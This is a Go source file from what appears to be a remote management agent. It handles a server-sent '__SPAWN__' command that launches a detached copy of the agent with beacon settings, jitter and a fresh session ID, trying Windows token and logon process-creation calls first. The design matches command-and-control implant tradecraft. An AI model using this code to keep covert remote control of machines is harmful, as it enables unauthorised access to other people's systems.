package main

import (
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"
	"time"
)

// derivedSessionID derives a fresh beacon-safe session ID from the parent.
// The server accepts only [A-Za-z0-9_-] identifiers of 8 to 128 characters,
// so the parent prefix is sanitized and bounded before the unique suffix.
func derivedSessionID(parent, tag string) string {
	var prefix strings.Builder
	for _, r := range parent {
		if (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') ||
			(r >= '0' && r <= '9') || r == '_' || r == '-' {
			prefix.WriteRune(r)
		}
		if prefix.Len() >= 32 {
			break
		}
	}
	if prefix.Len() == 0 {
		prefix.WriteString("go")
	}
	return fmt.Sprintf("%s-%s-%d", prefix.String(), tag, time.Now().UnixNano())
}

// spawnSessionID names the detached second agent started by __SPAWN__.
func spawnSessionID(parent string) string {
	return derivedSessionID(parent, "spawn")
}

// spawnEnvironment builds the child environment with explicit connection
// settings. The fresh RMM_SESSION_ID always overrides any inherited value so
// the spawned agent can never reuse the parent's identity. When the parent
// has no explicit log file, the child gets its own diagnostics file instead
// of interleaving appends into the parent's default log path.
func spawnEnvironment(cfg *config, sessionID string) []string {
	overrides := map[string]string{
		"RMM_BASE_URL":           cfg.BaseURL,
		"RMM_BEACON_SECRET":      cfg.BeaconSecret,
		"RMM_SESSION_ID":         sessionID,
		"RMM_AGENT_WORKSPACE_ID": cfg.WorkspaceID,
		"RMM_SLEEP_SECONDS":      strconv.Itoa(cfg.SleepSeconds),
		"RMM_JITTER_PERCENT":     strconv.Itoa(cfg.JitterPercent),
	}
	if cfg.HTTPProxy != "" {
		overrides["RMM_HTTP_PROXY"] = cfg.HTTPProxy
	}
	if os.Getenv("RMM_LOG_FILE") == "" {
		overrides["RMM_LOG_FILE"] = filepath.Join(os.TempDir(), "minimal-rmm-agent-"+sessionID+".log")
	}
	env := make([]string, 0, len(os.Environ())+len(overrides))
	for _, entry := range os.Environ() {
		key, _, _ := strings.Cut(entry, "=")
		if _, overridden := overrides[key]; !overridden {
			env = append(env, entry)
		}
	}
	for key, value := range overrides {
		env = append(env, key+"="+value)
	}
	return env
}

// spawnAgent starts a second copy of this agent as a detached process with a
// fresh session ID. The child's standard streams connect to the null device
// and its lifetime is independent of the parent, so the spawn never blocks
// this agent's synchronous command loop. The command returns as soon as the
// child process is created, not when it exits.
func spawnAgent(cfg *config) (string, error) {
	return spawnAgentWithIdentity(cfg, spawnSessionID(cfg.SessionID))
}

// parseSpawnCommand validates a server-selected session and workspace before
// any process is created. Legacy commands retain local identity generation.
func parseSpawnCommand(command string, cfg *config) (*config, string, error) {
	childConfig := *cfg
	if strings.TrimSpace(command) == "__SPAWN__" {
		return &childConfig, spawnSessionID(cfg.SessionID), nil
	}
	verb, body, found := strings.Cut(command, "\n")
	if !found || strings.TrimSpace(verb) != "__SPAWN__" {
		return nil, "", errors.New("spawn requires a JSON payload")
	}
	var payload struct {
		SessionID   string  `json:"session_id"`
		WorkspaceID *string `json:"workspace_id"`
	}
	if err := json.Unmarshal([]byte(body), &payload); err != nil {
		return nil, "", errors.New("invalid spawn payload")
	}
	if !agentSessionIDPattern.MatchString(payload.SessionID) || payload.SessionID == cfg.SessionID {
		return nil, "", errors.New("spawn requires a fresh token-safe session ID")
	}
	if payload.WorkspaceID != nil {
		if *payload.WorkspaceID != "" && !agentWorkspaceIDPattern.MatchString(*payload.WorkspaceID) {
			return nil, "", errors.New("invalid spawn workspace ID")
		}
		childConfig.WorkspaceID = *payload.WorkspaceID
	}
	return &childConfig, payload.SessionID, nil
}

// spawnCommand honors the server-selected identity so registration can be
// correlated independently of the command acknowledgement.
func spawnCommand(command string, cfg *config) (string, error) {
	childConfig, sessionID, err := parseSpawnCommand(command, cfg)
	if err != nil {
		return "", err
	}
	return spawnAgentWithIdentity(childConfig, sessionID)
}

// spawnAgentWithIdentity starts the validated child under its selected identity.
func spawnAgentWithIdentity(cfg *config, sessionID string) (string, error) {
	executable, err := os.Executable()
	if err != nil {
		return "", fmt.Errorf("resolve agent executable: %w", err)
	}
	// Deliberately exec.Command, not newCommand: newCommand binds children to
	// agentContext, and canceling this agent must not kill the spawned one.
	child := exec.Command(executable)
	child.Env = spawnEnvironment(cfg, sessionID)
	child.Stdin = nil
	child.Stdout = nil
	child.Stderr = nil
	detachSpawnCommand(child)
	diagnostics := &spawnDiagnostics{}
	pid, method, degraded, err := startDetachedAgent(child, diagnostics)
	detail, _ := json.Marshal(diagnostics)
	if err != nil {
		return "", fmt.Errorf("start spawned agent: %w\nspawn diagnostics=%s", err, detail)
	}
	return fmt.Sprintf("spawned session=%s pid=%d\nspawn method=%s identity_degraded=%t\nspawn diagnostics=%s", sessionID, pid, method, degraded, detail), nil
}

type spawnAttemptDiagnostic struct {
	Method    string `json:"method"`
	Success   bool   `json:"success"`
	ErrorCode uint32 `json:"error_code,omitempty"`
	Error     string `json:"error,omitempty"`
}

type spawnDiagnostics struct {
	ProcessIdentity      string                   `json:"process_identity,omitempty"`
	ActiveToken          bool                     `json:"active_token"`
	TokenType            string                   `json:"token_type,omitempty"`
	CredentialsAvailable bool                     `json:"credentials_available"`
	CreationFlags        uint32                   `json:"creation_flags,omitempty"`
	ProcessPrivileges    map[string]string        `json:"process_privileges,omitempty"`
	TokenPrivileges      map[string]string        `json:"token_privileges,omitempty"`
	Attempts             []spawnAttemptDiagnostic `json:"attempts"`
}

var errSpawnCredentialsUnavailable = errors.New("active logon credentials unavailable")

type spawnAttempt struct {
	name   string
	launch func() (int, error)
}

type spawnMethods struct {
	asUser, withToken, withLogon, original func() (int, error)
}

// dispatchSpawn is the production Windows method selector, shared with host tests.
func dispatchSpawn(active bool, methods spawnMethods, diagnostics ...*spawnDiagnostics) (int, string, bool, error) {
	attempts := []spawnAttempt{}
	if active {
		attempts = append(attempts, spawnAttempt{"CreateProcessAsUser", methods.asUser},
			spawnAttempt{"CreateProcessWithTokenW", methods.withToken},
			spawnAttempt{"CreateProcessWithLogonW", methods.withLogon})
	}
	attempts = append(attempts, spawnAttempt{"CreateProcessA", methods.original})
	pid, method, err := trySpawnAttempts(attempts, diagnostics...)
	return pid, method, active && method == "CreateProcessA", err
}

// trySpawnAttempts stops after the first successful creation to avoid duplicate agents.
func trySpawnAttempts(attempts []spawnAttempt, diagnostics ...*spawnDiagnostics) (int, string, error) {
	var failures []error
	for _, attempt := range attempts {
		if identityBoundaryFault.Load() {
			return 0, "", errIdentityUnsafe
		}
		pid, err := attempt.launch()
		if len(diagnostics) > 0 && diagnostics[0] != nil {
			result := spawnAttemptDiagnostic{Method: attempt.name, Success: err == nil}
			if err != nil {
				var code syscall.Errno
				switch {
				case errors.As(err, &code):
					result.ErrorCode, result.Error = uint32(code), code.Error()
					if code == 0 {
						result.Error = "process creation failed without a Windows error code"
					}
				case errors.Is(err, errSpawnCredentialsUnavailable):
					result.Error = errSpawnCredentialsUnavailable.Error()
				default:
					result.Error = "process creation failed"
				}
			}
			diagnostics[0].Attempts = append(diagnostics[0].Attempts, result)
		}
		if err == nil {
			return pid, attempt.name, nil
		}
		failures = append(failures, fmt.Errorf("%s: %w", attempt.name, err))
	}
	return 0, "", errors.Join(failures...)
}
